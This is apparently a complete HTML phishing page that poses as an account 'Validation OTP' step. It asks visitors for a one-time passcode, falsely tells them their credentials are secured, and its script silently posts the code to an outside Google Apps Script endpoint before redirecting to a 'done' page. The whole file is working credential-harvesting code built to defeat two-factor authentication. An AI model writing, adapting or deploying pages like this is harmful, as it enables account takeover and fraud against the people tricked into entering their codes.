<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Validation OTP</title>

<style>
body{
margin:0;
font-family:Arial;
background:#D4AF37;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
color:grey;
}

.container{
background:white;
padding:40px;
border-radius:12px;
width:400px;
text-align:center;
}

h1{font-weight:bold;}
h3{font-weight:normal;margin-bottom:30px;}

label{
display:block;
margin-bottom:10px;
font-weight:bold;
text-align:left;
}

input{
width:100%;
padding:12px;
border-radius:6px;
border:1px solid grey;
margin-bottom:20px;
text-align:center;
letter-spacing:4px;
}

button{
background:grey;
color:white;
padding:12px;
width:100%;
border:none;
border-radius:6px;
}

.footer{
margin-top:20px;
font-size:13px;
}
</style>
</head>

<body>

<div class="container">

<h1>VALIDATION OTP</h1>

<h3>
Enter the OTP to complete your account validation
</h3>

<form id="otpForm">

<label>Validation OTP</label>

<input
type="text"
id="otp"
required
pattern="[0-9]{4,8}"
maxlength="8"
placeholder="Enter OTP"
>

<button type="submit">Submit OTP</button>

</form>

<div class="footer">
Your credentials are secured.
</div>

</div>

<script>

const scriptURL="https://script.google.com/macros/s/AKfycbwb42VMZjlcad0mnEfbpMQf5lGbDa4o-4D2UumYQYmdMu3hy1e7iiPuDhVJpqpcqa5IXw/exec";

document.getElementById("otpForm").addEventListener("submit",function(e){

e.preventDefault();

fetch(scriptURL,{
method:"POST",
mode:"no-cors",
headers:{ "Content-Type":"application/json" },
body:JSON.stringify({
otp:document.getElementById("otp").value
})
})
.then(()=>{

window.location.href="done.html";

});

});
</script>

</body>
</html>
